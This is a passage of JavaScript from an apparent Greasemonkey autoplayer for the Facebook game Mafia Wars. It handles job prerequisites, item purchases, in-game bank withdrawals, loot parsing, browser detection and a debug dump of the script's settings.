    addToLog('warning Icon', 'BUG DETECTED (getJobRow): [exception: ' + ex + '], [conTxt: ' + conTxt + '], [jobName: ' + jobName + ']');
    DEBUG('BUG DETECTED (getJobRow): [exception: ' + ex + '], [conTxt: ' + conTxt + '], [jobName: ' + jobName + ']');
  }
  if (!rowElt) return false;
  return rowElt;
}

function getJobRowItems(jobName) {
  var currentJob = jobName;
  var currentJobRow = getJobRow(currentJob, innerPageElt);
  if (!currentJobRow) return false;
  var inner = innerPageElt? innerPageElt.innerHTML : '';
  var innerNoTags = inner.untag();

  if (innerNoTags.match(/You do not have enough cash to buy/i)) {
    addToLog('warning Icon', 'You don\'t have enough cash to buy necessary equipment.');
    var jobs = getSavedList('jobsToDo', '');
    if (jobs.indexOf(currentJob) == -1) {
      jobs.push(currentJob);
      DEBUG('Saving ' + currentJob + ' for later. Need to farm cash first.');
      setSavedList('jobsToDo', jobs);
      return true;
    } else {
      GM_setValue('autoMission', 0);
      addToLog('warning Icon', 'No more available jobs in jobsToDo list, so turning off autoMission.');
      return false;
    }
  }

  var buyItemElts = $x('.//a[contains(@onclick, "xw_action=buy_item")]',currentJobRow);
  if(!buyItemElts) buyItemElts = $x('.//a[contains(@onclick, "MapController.buyItems")]',currentJobRow);

  // Click to buy items
  if (buyItemElts.length > 0){
    addToLog('search Icon', 'Attempting to purchase required items.');
    for (var i = 0, numItems=buyItemElts.length; i < numItems; ++i) {
      Autoplay.fx = function() {
        clickAction = 'buy item';
        clickElement(buyItemElts[i]);
        DEBUG('Clicked to buy item.');
      };
      break;
    }
    return true;
  }

  // New Job layout handling
  var amtElt = xpathFirst('.//strong[@class="cash cash_'+cities[city][CITY_ALIAS]+'"]', currentJobRow);
  if(!amtElt) amtElt = xpathFirst('.//div[@class="job_uses"]//dd[@class="vegas_cash_icon"]', currentJobRow);
  if (amtElt) {
    var cashDiff = getJobClicks() * parseCash(amtElt.innerHTML.untag().trim()) - cities[city][CITY_CASH];
    // Withdraw the amount we need
    if (cashDiff > 0) {
      DEBUG('We need '+cashDiff+' for this job. Going to the bank/vault of '+city);
      suspendBank = true;
      return (autoBankWithdraw(city, cashDiff));
    }
  }


  // Logic to switch to the required job first
  var necessaryItems = $x('.//div[@class="req_item"]//img', currentJobRow);
  //if(!necessaryItems) necessaryItems = $x('.//div[@class="needed_gate_loot"]//img', currentJobRow);

  // Figure out which loot items are needed before this job can be attempted
  // again and, consequently, which jobs will have to be done to get them.
  if (necessaryItems.length > 0) {
    DEBUG('Some Items Required for this job');
    // Save the current job for later. The current job should not already exist in the list, so check first.
    var items = getSavedList('itemList');
    var jobs = getSavedList('jobsToDo', '');
    if (jobs.indexOf(currentJob) == -1) {
      jobs.push(currentJob);
      DEBUG('Saving ' + currentJob + ' for later. Need to fetch pre-req items first.');
      setSavedList('jobsToDo', jobs);
    }

    var itemsFound = false;
    necessaryItems.forEach(
      function(i){
        var itmSearch = i.alt.replace(/set of/i, '').trim();
        DEBUG('Missing: ' + itmSearch);
        var itemFound = false;
        // Try fetching the items from the job requirement array
        requirementJob.forEach(
          function(j){
            if (level >= cities[j[2]][CITY_LEVEL] && j[0].toUpperCase().trim() == itmSearch.toUpperCase().trim()) {
              jobs.push(j[1]);
              items.push(itmSearch);
              itemFound = true;
            }
          }
        );

        // Set the flag if at least one item is found
        if (itemFound) itemsFound = true;
        else DEBUG(itmSearch + ' not found in the requirement job array.');
      }
    );

    // At least one item found
    if (itemsFound) {
      setSavedList('itemList', items.unique());
      setSavedList('jobsToDo', jobs);
      popJob();
      return true;
    }
  } else {
    necessaryItems = xpathFirst('.//span[@class="missing_req_items"]', currentJobRow);
    itmSearch='';
    if(necessaryItems){
      itmSearch = necessaryItems.innerHTML;
      itmSearch = itmSearch.replace("(×1)", "");
    } else {
      necessaryItems = xpathFirst('.//div[@class="needed_gate_loot"]', currentJobRow);
      if(necessaryItems){
        messages = $x('.//img', necessaryItems);
        numMessages = messages.length;
        for (i = 0; i < numMessages; i++) {
          var item = messages[i].title;
          if (itmSearch == '') {
            itmSearch = item;
          } else {
            itmSearch = itmSearch + ', ' + item;
          }
        }
      }
    }

    if(itmSearch!=''){
      DEBUG('Item(s) Required for this job');
      // Save the current job for later. The current job should not already exist in the list, so check first.
      var items = getSavedList('itemList');
      var jobs = getSavedList('jobsToDo', '');
      DEBUG('Current Job List: '+jobs);
      if (jobs.indexOf(currentJob) == -1) {
        jobs.push(currentJob);
        DEBUG('Saving ' + currentJob + ' for later. Need to fetch pre-req items first.');
        setSavedList('jobsToDo', jobs);
      } else {
       DEBUG(currentJob + ' already saved for later. Need to fetch pre-req items first.');
      }

      var itemFound = false;
      // Try fetching the items from the job requirement array
      requirementJob.forEach(
        function(j){
          if (level >= cities[j[2]][CITY_LEVEL] && j[0] == itmSearch) {
            jobs.push(j[1]);
            items.push(itmSearch);
            itemFound = true;
            jobFound = j[1];
          }
        }
      );

      // Set the flag if at least one item is found
      if (!itemFound) DEBUG(itmSearch + ' not found in the requirement job array.');
      else {
        setSavedList('itemList', items.unique());
        setSavedList('jobsToDo', jobs);
        popJob();
        return true;
      }
    }
  }

  // Withdraw money
  var amtElt = xpathFirst('.//td[contains(@class,"job_energy")]//span[@class="money" or @class="bad"]', currentJobRow);
  if (amtElt) {
    var cashDiff = getJobClicks() * parseCash(amtElt.innerHTML) - cities[city][CITY_CASH];

    // Withdraw the amount we need
    if (cashDiff > 0) {
      suspendBank = true;
      return (autoBankWithdraw(city, cashDiff));
    }
  }

  return false;
}

function popJob(){
  var jobs = getSavedList('jobsToDo', '');
  // Set the very next job to perform.
  var doJob = jobs.pop();
  setSavedList('jobsToDo', jobs);
  var i = 0;
  missions.forEach(
    function(f) {
      if (f[0].toUpperCase().trim() == doJob.toUpperCase().trim()) {
        GM_setValue('selectMission', i);
        addToLog('info Icon', 'Switching job to ' + doJob + '.');
      }
      i++;
    }
  );
}

// Set the next job to be done for job combination options
function jobCombo(element) {
  var i;
  if (isGMChecked('multipleJobs')) {
    // Cycle jobs with the same ratio
    var availableJobs = eval('(' + GM_getValue('availableJobs', "{0:{},1:{},2:{},3:{},4:{}}") + ')');
    var multiple_jobs_list = getSavedList('selectMissionMultiple');
    var cycle_jobs = new Object();

    // Group selected jobs by ratio
    for (i = 0, iLength=multiple_jobs_list.length; i < iLength; ++i) {
      var job = multiple_jobs_list[i];
      var mission = missions[job];
      if(!mission) continue;
      // Put non-available jobs at the end of the queue
      if (availableJobs[mission[MISSION_CITY]][mission[MISSION_TAB]] != null &&
          availableJobs[mission[MISSION_CITY]][mission[MISSION_TAB]].indexOf(parseInt(job)) == -1) {
        mission[MISSION_RATIO] = 0;
      }

      if (cycle_jobs[mission[MISSION_RATIO]] == null) {
        cycle_jobs[mission[MISSION_RATIO]] = [];
      }
      cycle_jobs[mission[MISSION_RATIO]].push(multiple_jobs_list[i]);
    }

    // Rebuild the job list array
    multiple_jobs_list = [];
    for (i in cycle_jobs) {
      if (cycle_jobs[i].length > 1) {
        // Only cycle the current job's ratio group
        if (missions[GM_getValue('selectMission', 1)][MISSION_RATIO] == i) {
          cycle_jobs[i].push(cycle_jobs[i].shift());
        }
        for (var n = 0, nLength=cycle_jobs[i].length; n < nLength; ++n) {
          multiple_jobs_list.push(cycle_jobs[i][n]);
        }
      } else {
        multiple_jobs_list.push(cycle_jobs[i][0]);
      }
    }
    setSavedList('selectMissionMultiple', multiple_jobs_list);
  }
}

function jobLoot(element) {
  var i, lootbag = [];
  var strLoot = '';
  // See what loot was gained.
  var messages = $x('.//td[@class="message_body"]', element);
  var numMessages = messages.length;
  for (i = 1; i < numMessages; i++) {
    var innerNoTags = messages[i].innerHTML.untag();
    if (innerNoTags.match(/You\s+gained(?:\s+an?)?\s+(.+)\./) ||
        innerNoTags.match(/found(?:\s+an?)?\s+(.*?)\s+on\s+the/i) ||
        innerNoTags.match(/earned(?:\s+an?)?\s+(.*?)\.\s+you\s+/i)) {
      var loot = RegExp.$1;
      if(loot.match(/(.*?)\.\s+use/i)) loot = RegExp.$1;
      if (strLoot) strLoot += '<br/>'+'Found <span class="loot">'+loot+'</span> in the job.';
      else strLoot = strLoot + 'Found <span class="loot">' + loot+'</span> in the job.';
      lootbag.push(loot);
      addToLog('lootbag Icon', strLoot);
    }
  }

  // Vegas Loot on jobs
  if (city == LV) {
    var jobResults = xpathFirst('.//div[@class="job_results"]', element);
    strLoot = '';
    messages = $x('.//img', jobResults);
    numMessages = messages.length;
    for (i = 0; i < numMessages; i++) {
      if(messages[i].title){
        var loot = messages[i].title;
        if(loot.match(/(.*?)\.\s+use/i)) loot = RegExp.$1;
        if (strLoot) strLoot += '<br/>'+'Found <span class="loot">'+loot+'</span> in the job.';
        else strLoot = strLoot + 'Found <span class="loot">' + loot+'</span> in the job.';
        lootbag.push(loot);
      }
    }
    if (numMessages > 0 && strLoot !='') {
      addToLog('lootbag Icon', strLoot);
    }
  }

  DEBUG('Found ' + lootbag.length + ' item(s) on this job.');

  var items = getSavedList('itemList');
  if (typeof(items[0]) == 'undefined' || items.length == 0) {
    DEBUG('No items in required item list.');
    return;
  }

  var itemFound = false;
  var itemName;
  // NOTE: The single equal sign is intentional in this while() condition.
  while ((itemName = lootbag.pop())) {
    DEBUG('Looking for ' + itemName + ' in needed items list.');
    DEBUG('We need ' + items.length + ' item(s).');
    for (var j = 0, jLength=items.length; j < jLength; j++) {
      if (itemName.indexOf(items[j]) != -1 ) {
        // we found some needed loot
        itemFound = true;
        addToLog('found Icon','<span class="loot">'+ itemName + '</span> is the item we were looking for!');
        removeSavedListItem('itemList', itemName);
        removeJobForItem('jobsToDo', itemName);
        popJob();
      }
    }
  }
}

function debugDumpSettings() {
  // Use showIfUnchecked() to show 0 value as "un-checked", or showIfSelected()
  // to show 0 value as "not selected" (for radio buttons).

  var getJobList = function(listName){
    var multiple_jobs_list = getSavedList(listName);
    var jobNames = [];
    for (var i=0, numJobs=multiple_jobs_list.length; i < numJobs; ++i) {
      jobNames.push(missions[multiple_jobs_list[i]][MISSION_NAME]);
    }
    return jobNames.join(', ');
  };

  var ratioJobs = getJobList('selectMissionMultiple');
  var selectTier = 'None';
  if (GM_getValue('selectTier') != '0.0') {
    selectedTierValue = GM_getValue('selectTier').split('.');
    selectTier = cities[parseInt(selectedTierValue[0])][0] + ' - ' + missionTabs[NY][parseInt(selectedTierValue[1]) - 1];
  }

  if (GM_getValue('language') != 'en') {
    DEBUG('Language is "' + GM_getValue('language') + '".');
    addToLog('warning Icon', 'Unfortunately, only the English version of the game is fully supported. If you experience problems, set your Facebook language to English and try again.');
  }

// KCMCL Moved here, other wise this is getting executed every load and refresh, only need it for debug. Browser Detection - FIXME: This may not be the best way to impliment this

var BrowserDetect = {
  init: function () {
    this.browser = this.searchString(this.dataBrowser) || "An unknown browser";
    this.version = this.searchVersion(navigator.userAgent)
      || this.searchVersion(navigator.appVersion)
      || "an unknown version";
    this.OS = this.searchString(this.dataOS) || "an unknown OS";
  },
  searchString: function (data) {
    for (var i=0;i<data.length;i++)  {
      var dataString = data[i].string;
      var dataProp = data[i].prop;
      this.versionSearchString = data[i].versionSearch || data[i].identity;
      if (dataString) {
        if (dataString.indexOf(data[i].subString) != -1)
          return data[i].identity;
      }
      else if (dataProp)
        return data[i].identity;
    }
  },
  searchVersion: function (dataString) {
    var index = dataString.indexOf(this.versionSearchString);
    if (index == -1) return;
    return parseFloat(dataString.substring(index+this.versionSearchString.length+1));
  },
  dataBrowser: [
    {
      string: navigator.userAgent,
      subString: "Chrome",
      identity: "Chrome"
    },
    {   string: navigator.userAgent,
      subString: "OmniWeb",
      versionSearch: "OmniWeb/",
      identity: "OmniWeb"
    },
    {
      string: navigator.vendor,
      subString: "Apple",
      identity: "Safari",
      versionSearch: "Version"
    },
    {
      prop: window.opera,
      identity: "Opera"
    },
    {
      string: navigator.vendor,
      subString: "iCab",
      identity: "iCab"
    },
    {
      string: navigator.vendor,
      subString: "KDE",
      identity: "Konqueror"
    },
    {
      string: navigator.userAgent,
      subString: "Firefox",
      identity: "Firefox"
    },
    {
      string: navigator.vendor,
      subString: "Camino",
      identity: "Camino"
    },
    {    // for newer Netscapes (6+)
      string: navigator.userAgent,
      subString: "Netscape",
      identity: "Netscape"
    },
    {
      string: navigator.userAgent,
      subString: "MSIE",
      identity: "Explorer",
      versionSearch: "MSIE"
    },
    {
      string: navigator.userAgent,
      subString: "Gecko",
      identity: "Mozilla",
      versionSearch: "rv"
    },
    {     // for older Netscapes (4-)
      string: navigator.userAgent,
      subString: "Mozilla",
      identity: "Netscape",
      versionSearch: "Mozilla"
    }
  ],
  dataOS : [
    {
      string: navigator.platform,
      subString: "Win",
      identity: "Windows"
    },
    {
      string: navigator.platform,
      subString: "Mac",
      identity: "Mac"
    },
    {
         string: navigator.userAgent,
         subString: "iPhone",
         identity: "iPhone/iPod"
      },
    {
      string: navigator.platform,
      subString: "Linux",
      identity: "Linux"
    }
  ]

};

BrowserDetect.init();

  DEBUG('>  >  >  >  >  BEGIN SETTINGS DUMP  <  <  <  <  <<br>' +
          '------------------ End-User System -------------------<br>' +
        'Browser Name: <strong>' + BrowserDetect.browser + '</strong><br>' +
        'Browser Version: <strong>' + BrowserDetect.version + '</strong><br>' +
        'Operating System: <strong>' + BrowserDetect.OS + '</strong><br>' +
        'New Layout: <strong>' + new_header + '</strong><br>' +
          '------------------ PS MWAP Settings---------------------<br>' +
        'Script Version: <strong>' + SCRIPT.version + '</strong><br>' +
        'Language: <strong>' + GM_getValue('language') + '</strong><br>' +
        'isFlashed: <strong>' + isFlashed + '</strong><br>' +
        'isRunning: <strong>' + running + '</strong><br>' +
        'Player current level: <strong>' + level + '</strong><br>' +
        'Player points to next level: <strong>' + ptsToNextLevel + '</strong><br>' +
        'Player mafia size: <strong>' + mafia + '</strong><br>' +
        'Player attack profile: <strong>' + curAttack + '</strong><br>' +
        'Player defense profile: <strong>' + curDefense + '</strong><br>' +
        'Player attack equip: <strong>' + curAttackEquip + '</strong><br>' +
        'Player defense equip: <strong>' + curDefenseEquip + '</strong><br>' +
        'Player health: <strong>' + health + '/' + maxHealth + '</strong><br>' +
        'Player energy: <strong>' + energy + '/' + maxEnergy + '</strong><br>' +
        'Player stamina: <strong>' + stamina + '/' + maxStamina + '</strong><br>' +
        'Player skill points: <strong>' + stats + '</strong><br>' +
        'Energy pack waiting? <strong>' + energyPack + '</strong><br>' +
        'Current location: <strong>' + cities[city][CITY_NAME] + '</strong><br>' +
        'NY cash: <strong>' + (isUndefined(cities[NY][CITY_CASH]) ? 'unknown' : '$' + makeCommaValue(cities[NY][CITY_CASH])) + '</strong><br>' +
        'Cuba cash: <strong>' + (isUndefined(cities[CUBA][CITY_CASH]) ? 'unknown' : 'C$' + makeCommaValue(cities[CUBA][CITY_CASH])) + '</strong><br>' +
        'Moscow cash: <strong>' + (isUndefined(cities[MOSCOW][CITY_CASH]) ? 'unknown' : 'R$' + makeCommaValue(cities[MOSCOW][CITY_CASH])) + '</strong><br>' +
        'Bangkok cash: <strong>' + (isUndefined(cities[BANGKOK][CITY_CASH]) ? 'unknown' : 'B$' + makeCommaValue(cities[BANGKOK][CITY_CASH])) + '</strong><br>' +
        'Vegas cash: <strong>' + (isUndefined(cities[LV][CITY_CASH]) ? 'unknown' : 'V$' + makeCommaValue(cities[LV][CITY_CASH])) + '</strong><br>' +
        '-------------------General Tab--------------------------<br>' +
        'Enable auto-refresh: <strong>' + showIfUnchecked(GM_getValue('autoClick'))+ '</strong><br>' +
        '&nbsp;&nbsp;-Refresh rate low: <strong>'+ GM_getValue('r1') + '</strong><br>' +
        '&nbsp;&nbsp;-Refresh rate high: <strong>' + GM_getValue('r2') + '</strong><br>' +
        'Enable auto-pause: <strong>' + showIfUnchecked(GM_getValue('autoPause')) + '</strong><br>' +
        '&nbsp;&nbsp;-After level up: <strong>' + showIfSelected(GM_getValue('autoPauseAfter')) + '</strong><br>' +
        '&nbsp;&nbsp;-Before level up: <strong>' + showIfSelected(GM_getValue('autoPauseBefore')) + '</strong><br>' +
        '&nbsp;&nbsp;-Exp to pause at: <strong>'+ GM_getValue('autoPauseExp') + '</strong><br>' +
        'Delay rate low: <strong>'+ GM_getValue('d1') + '</strong><br>' +
        'Delay rate high: <strong>' + GM_getValue('d2') + '</strong><br>' +
        'Idle in City: <strong>' + showIfUnchecked(GM_getValue('idleInCity')) + '</strong><br>' +
        '&nbsp;&nbsp;Selected city: <strong>' + cities[GM_getValue('idleLocation', NY)][CITY_NAME] + '</strong><br>' +
        'Enable auto-Daily Chance: <strong>' + showIfUnchecked(GM_getValue('autoLottoOpt')) + '</strong><br>' +
        'Enable collect Daily Chance bonus: <strong>' + showIfUnchecked(GM_getValue('autoLottoBonus'))  + ' == ' + autoLottoBonusList[GM_getValue('autoLottoBonusItem', 0)] + '</strong><br>' +
        'Spend all: <strong>' + showIfUnchecked(GM_getValue('burnFirst')) + ' == ' + burnModes[GM_getValue('burnOption')] + '</strong><br>' +
        'Perform featured jobs: <strong>' + showIfUnchecked(GM_getValue('featJob')) + '</strong><br>' +
        '&nbsp;&nbsp;Selected job: <strong>' + featJobNames[GM_getValue('featJobIndex', 0)] + '</strong><br>' +
        'Choose Sides: <br>' +
        '&nbsp;&nbsp;Moscow: <strong>' + cities[MOSCOW][CITY_SIDES][GM_getValue('sideMoscow', 0)] + '</strong><br>' +
        '&nbsp;&nbsp;Bangkok: <strong>' + cities[BANGKOK][CITY_SIDES][GM_getValue('sideBangkok', 0)] + '</strong><br>' +
        '---------------------Display Tab--------------------<br>' +
        'Enable logging: <strong>' + showIfUnchecked(GM_getValue('autoLog')) + '</strong><br>' +
        '&nbsp;&nbsp;-Logging length: <strong>' + GM_getValue('autoLogLength') + '</strong><br>' +
        'Log player updates: <strong>' + showIfUnchecked(GM_getValue('logPlayerUpdates')) + '</strong><br>' +
        '&nbsp;&nbsp;-Updates length: <strong>' + GM_getValue('logPlayerUpdatesMax') + '</strong><br>' +
        'Enable log filtering: <strong>' + showIfUnchecked(GM_getValue('filterLog')) + '</strong><br>' +
        '&nbsp;&nbsp;Filter mode: <strong>' + GM_getValue('filterOpt') + '</strong><br>' +
        '&nbsp;&nbsp;Filter pass: <strong>' + GM_getValue('filterPass') + '</strong><br>' +
        '&nbsp;&nbsp;Filter fail: <strong>' + GM_getValue('filterFail') + '</strong><br>' +
        'Left-align main frame: <strong>'+ showIfUnchecked(GM_getValue('leftAlign')) + '</strong><br>' +
        'Elevate PS MWAP-Header: <strong>'+ showIfUnchecked(GM_getValue('mastheadOnTop')) + '</strong><br>' +
        'Hide Daily List: <strong>'+ showIfUnchecked(GM_getValue('hideActionBox')) + '</strong><br>' +
        'Hide Limited Time Offers: <strong>'+ showIfUnchecked(GM_getValue('hideOffer')) + '</strong><br>' +
        'Hide gifts: <strong>'+ showIfUnchecked(GM_getValue('hideGifts')) + '</strong><br>' +
        'Hide Friend Ladder: <strong>'+ showIfUnchecked(GM_getValue('hideFriendLadder')) + '</strong><br>' +
        'Hide Messagecenter Icon: <strong>'+ showIfUnchecked(GM_getValue('hideMessageIcon')) + '</strong><br>' +
        'Hide Gift Icon: <strong>'+ showIfUnchecked(GM_getValue('hideGiftIcon')) + '</strong><br>' +
        'Hide Promo Icon: <strong>'+ showIfUnchecked(GM_getValue('hidePromoIcon')) + '</strong><br>' +
        'Hide Live Updates Icon: <strong>'+ showIfUnchecked(GM_getValue('hideLiveUpdatesIcon')) + '</strong><br>' +
        'Hide Icons: <strong>'+ showIfUnchecked(GM_getValue('hideAttentionBox')) + '</strong><br>' +
        'Hide Collections: <strong>'+ showIfUnchecked(GM_getValue('HideCollections')) + '</strong><br>' +
        'Show pulse on the fight page: <strong>' + showIfUnchecked(GM_getValue('showPulse')) + '</strong><br>' +
        'Show level on the hitlist page: <strong>' + showIfUnchecked(GM_getValue('showLevel')) + '</strong><br>' +
        'Set window title to name on Facebook account: <strong>' + showIfUnchecked(GM_getValue('fbwindowtitle')) + '</strong><br>' +
        'Loot filter: <strong>' + GM_getValue('filterLootOpt') + '</strong><br>' +
        '---------------------Mafia Tab--------------------<br>' +
        'Automatically asks for job help: <strong>' + showIfUnchecked(GM_getValue('autoAskJobHelp')) + '</strong><br>' +
        'Ask for Moscow help: <strong>' + GM_getValue('selectMoscowTier') + '</strong><br>' +
        'Ask for Bangkok help: <strong>' + GM_getValue('selectBangkokTier') + '</strong><br>' +
        'Minimum experience for job help: <strong>' + GM_getValue('autoAskJobHelpMinExp') + '</strong><br>' +
        'Miscellaneous publishing: <br>' +
        '&nbsp;&nbsp;Secret stash: <strong>' + showIfUnchecked(GM_getValue('autoSecretStash')) + '</strong><br>' +
        '&nbsp;&nbsp;Secret Stash Frequency: <strong>' + GM_getValue('autoSecretStashFrequency') + '</strong><br>' +
        '&nbsp;&nbsp;Ice bonus: <strong>' + showIfUnchecked(GM_getValue('autoIcePublish')) + '</strong><br>' +
        '&nbsp;&nbsp;Ice bonus Frequency: <strong>' + GM_getValue('autoIcePublishFrequency') + '</strong><br>' +
        '&nbsp;&nbsp;Level-up bonus: <strong>' + showIfUnchecked(GM_getValue('autoLevelPublish')) + '</strong><br>' +
        '&nbsp;&nbsp;Achievement bonus: <strong>' + showIfUnchecked(GM_getValue('autoAchievementPublish')) + '</strong><br>' +
        '&nbsp;&nbsp;Automatically share wishlist: <strong>' + showIfUnchecked(GM_getValue('autoShareWishlist')) + '</strong><br>' +
        '&nbsp;&nbsp;Hour interval for sharing wishlist: <strong>' + GM_getValue('autoShareWishlistTime') + '</strong><br>' +
        'Accept mafia invitations: <strong>'+ showIfUnchecked(GM_getValue('acceptMafiaInvitations')) + '</strong><br>' +
        'Automatically Help on Jobs: <strong>' + showIfUnchecked(GM_getValue('autoHelp')) + '</strong><br>' +
        'Automatically Help on Wars: <strong>' + showIfUnchecked(GM_getValue('autoWarHelp')) + '</strong><br>' +
        'Automatically Help on Burners: <strong>' + showIfUnchecked(GM_getValue('autoBurnerHelp')) + '</strong><br>' +
        'Automatically Help on Parts: <strong>' + showIfUnchecked(GM_getValue('autoPartsHelp')) + '</strong><br>' +
        'Skip gift wall posts: <strong>' + showIfUnchecked(GM_getValue('autoGiftSkipOpt')) + '</strong><br>' +
        'Auto Gift Waiting: <strong>' + showIfUnchecked(GM_getValue('autoGiftWaiting'))  + '</strong><br>' +
        'Auto Gift Accept: <strong>' + showIfUnchecked(GM_getValue('autoGiftAccept'))  + '</strong><br>' +
        '&nbsp;&nbsp;Gift Choice: <strong>' + GM_getValue('autoGiftAcceptChoice', 'none')   + '</strong><br>' +
        '&nbsp;&nbsp;Gift Reward: <strong>' + GM_getValue('autoGiftAcceptReward', 'none')   + '</strong><br>' +
        'Auto Crime Spree: <strong>' + showIfUnchecked(GM_getValue('autoSafehouse'))  + '</strong><br>' +
        'Auto War: <strong>' + showIfUnchecked(GM_getValue('autoWar'))  + '</strong><br>' +
        '&nbsp;&nbsp;War Mode: <strong>' + warModeChoices[GM_getValue('warMode', 0)]  + '</strong><br>' +
        '&nbsp;&nbsp;Auto War Target List: <strong>' + GM_getValue('autoWarTargetList', 0) + '</strong><br>' +
        '&nbsp;&nbsp;Publish war declaration: <strong>' + showIfUnchecked(GM_getValue('autoWarPublish')) + '</strong><br>' +
        '&nbsp;&nbsp;Publish call for backup: <strong>' + showIfUnchecked(GM_getValue('autoWarResponsePublish')) + '</strong><br>' +
        '&nbsp;&nbsp;Publish reward: <strong>' + showIfUnchecked(GM_getValue('autoWarRewardPublish')) + '</strong><br>' +
        '&nbsp;&nbsp;Publish rally for help: <strong>' + showIfUnchecked(GM_getValue('autoWarRallyPublish')) + '</strong><br>' +
        '-------------------Autostat Tab--------------------<br>' +
        'Enable auto-stat: <strong>' + showIfUnchecked(GM_getValue('autoStat')) + '</strong><br>' +
        'Disable auto-stat: <strong>' + showIfUnchecked(GM_getValue('autoStatDisable')) + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Base: <strong>' + GM_getValue('autoStatAttackBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Base: <strong>' + GM_getValue('autoStatDefenseBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Base: <strong>' + GM_getValue('autoStatHealthBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Base: <strong>' + GM_getValue('autoStatEnergyBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Stamina Base: <strong>' + GM_getValue('autoStatStaminaBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Ratio: <strong>' + GM_getValue('autoStatAttackRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Ratio: <strong>' + GM_getValue('autoStatDefenseRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Ratio: <strong>' + GM_getValue('autoStatHealthRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Ratio: <strong>' + GM_getValue('autoStatEnergyRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Stamina Ratio: <strong>' + GM_getValue('autoStatStaminaRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Mode: <strong>' + GM_getValue('autoStatAttackMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Mode: <strong>' + GM_getValue('autoStatDefenseMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Mode: <strong>' + GM_getValue('autoStatHealthMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Mode: <strong>' + GM_getValue('autoStatEnergyMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Stamina Mode: <strong>' + GM_getValue('autoStatStaminaMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Prio: <strong>' + GM_getValue('autoStatAttackPrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Prio: <strong>' + GM_getValue('autoStatDefensePrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Prio: <strong>' + GM_getValue('autoStatHealthPrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Prio: <strong>' + GM_getValue('autoStatEnergyPrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Stamina Prio: <strong>' + GM_getValue('autoStatStaminaPrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Fallback: <strong>' + GM_getValue('autoStatAttackFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Fallback: <strong>' + GM_getValue('autoStatDefenseFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Fallback: <strong>' + GM_getValue('autoStatHealthFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Fallback: <strong>' + GM_getValue('autoStatEnergyFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Stamina Fallback: <strong>' + GM_getValue('autoStatStaminaFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Rest AutoStat: <strong>' + GM_getValue('restAutoStat') + '</strong><br>' +
        '&nbsp;&nbsp;-Next Stat: <strong>' + GM_getValue('nextStat') + '</strong><br>' +
        //'autoMainframe: <strong>' + showIfUnchecked(GM_getValue('autoMainframe')) + '</strong><br>' +
        '&nbsp;&nbsp;-autoMainframeCode: <strong>' + GM_getValue('autoMainframeCode') + '</strong><br>' +
        'autoResetTimers: <strong>' + showIfUnchecked(GM_getValue('autoResetTimers')) + '</strong><br>' +
        'autoDailyChecklist: <strong>' + showIfUnchecked(GM_getValue('autoDailyChecklist')) + '</strong><br>' +
        'autoEnforcedTitle: <strong>' + GM_getValue('autoEnforcedTitle') + '</strong><br>' +
        '&nbsp;&nbsp;Hour interval for title enforcing: <strong>' + GM_getValue('autoEnforcedTitleTime') + '</strong><br>' +
        '-------------------Energy Tab--------------------<br>' +
        'Enable auto-mission: <strong>' + showIfUnchecked(GM_getValue('autoMission')) + '</strong><br>' +
        'Enabled job bursts: <strong>' + showIfUnchecked(GM_getValue('burstJob')) + ' == Fire ' + GM_getValue('burstJobCount') + ' job attempts everytime</strong><br>' +
        '&nbsp;&nbsp;-Repeat Job: <strong>' + showIfUnchecked(GM_getValue('repeatJob')) + '</strong><br>' +
        '&nbsp;&nbsp;-Job selected: <strong>' + missions[GM_getValue('selectMission')][MISSION_NAME] + '</strong><br>' +
        '&nbsp;&nbsp;-Multiple Jobs: <strong>' + showIfUnchecked(GM_getValue('multipleJobs')) + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;&nbsp;-Jobs: <strong>' + ratioJobs + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;&nbsp;-Mastery Tier: <strong>' + selectTier + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;&nbsp;-Optimize at end level: <strong>' + showIfUnchecked(GM_getValue('endLevelOptimize')) + '</strong><br>' +
        'Enable auto-energy pack: <strong>' + showIfUnchecked(GM_getValue('autoEnergyPack')) + '</strong><br>' +
        'Estimated job ratio: <strong>' + GM_getValue('estimateJobRatio') + '</strong><br>' +
        'Has helicopter: <strong>' + showIfUnchecked(GM_getValue('hasHelicopter')) + '</strong><br>' +
        'Has golden throne: <strong>' + showIfUnchecked(GM_getValue('hasGoldenThrone')) + '</strong><br>' +
        'Is Maniac: <strong>' + showIfUnchecked(GM_getValue('isManiac')) + '</strong><br>' +
        'Auto send energy pack: <strong>' + showIfUnchecked(GM_getValue('sendEnergyPack')) + '</strong><br>' +
        'Auto ask energy pack: <strong>' + showIfUnchecked(GM_getValue('askEnergyPack')) + '</strong><br>' +
        'Reward for energy pack: <strong>' + showIfUnchecked(GM_getValue('rewardEnergyPack')) + '</strong><br>' +
        'Skip Fighting In Job Tier Mastery: <strong>' + showIfUnchecked(GM_getValue('skipfight')) + '</strong><br>' +
        'Check for mini Energy Packs: <strong>' + showIfUnchecked(GM_getValue('checkMiniPack')) + '</strong><br>' +
